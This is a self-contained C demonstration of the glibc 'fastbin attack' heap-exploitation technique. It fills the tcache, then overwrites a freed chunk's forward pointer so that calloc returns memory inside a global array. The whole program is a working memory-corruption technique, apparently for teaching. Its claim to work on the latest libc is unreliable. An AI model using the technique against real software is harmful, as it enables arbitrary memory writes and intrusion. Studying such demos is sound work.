#include <stdio.h>
#include <stdlib.h>
#include <assert.h>


unsigned int long target[4];

int main(int argc, char **argv){
	system("clear");
	puts("\t\t\t\t\t[ Fast Bin Attack ]");
	puts("\t\t\t\t\t-------------------");
	fprintf(stderr, "- This is a demo on FastBin attack and its compiled in the lastest version of libc =).\n"); 
	fprintf(stderr, "- Here we will allocate a chunk outside of the heap into bss using the fastbin attack. A fastbin attack\n");
	fprintf(stderr, "requires either a HeapOverflow Bug or a DoubleFree bug but a UAF bug must be present for it to work.\n\n");

	unsigned long *a[7]; // This is an array that will be used to fill up the Tcache to idx [7];
	unsigned long *b, *c,*d;

	for(int i = 0;i < 7;i++)
		a[i] = (unsigned long *) malloc(0x10); // This is used to allocate 7 chunks are free them to fill in tcache.

	b = (unsigned long *) malloc(0x10); // This is the allocation of FastBin Chunks.
	c = (unsigned long *) malloc(0x10);

	for(int j = 0;j < 7;j++)
		free(a[j]); // This is used to fill up the tcache
	
	fprintf(stderr, "- Free() the allocated chunks to add them into the fastbin. They are added from the head of the linked list\n");
	free(b);free(c); // These chunks therefore will end up in the FastBin(s).
	/* - A fastbin attack requires either a HeapOverflow bug or Double Free but a UAF bug must be present*/

	fprintf(stderr, "- The allocated chunks:\n\tChunk(b): [%p]\n\tChunk(c): [%p]\n", b, c);
	fprintf(stderr, "\n- The address of Target: [%p]. This is the (address + 0x10) that we want malloc to return.\n", &target);
	fprintf(stderr, "\n- The (fd) pointer of chunk(b) is %p. This is the pointer that we are going to update\n", *b);
	fprintf(stderr, "and trick malloc() into thinking that &target is the next address in the linked list.\n");
	
	target[1] = 0x21; // Thsi is used to update the size. Since malloc checks if the size of the next chunk is corresponded to the idx of that bin.	
	b[0] = (unsigned long)((char *)&target);
	
	fprintf(stderr, "- Now we updated the (fd) pointer to chunk (b) that now points to [%p] the address of target.\n\n", *b);
	unsigned long *e[3];
	for(int i = 0;i < 3;i++){
		e[i] = (unsigned long *) calloc(1, 0x10);
	}

	fprintf(stderr, "- Therefore after some checks the value that will be returned by malloc is : [%p] (address of target + 0x10)\n", ((char *)&target + 0x10));
	assert(e[2] == (unsigned long *) ((char *)&target + 0x10));
	return 0;
}
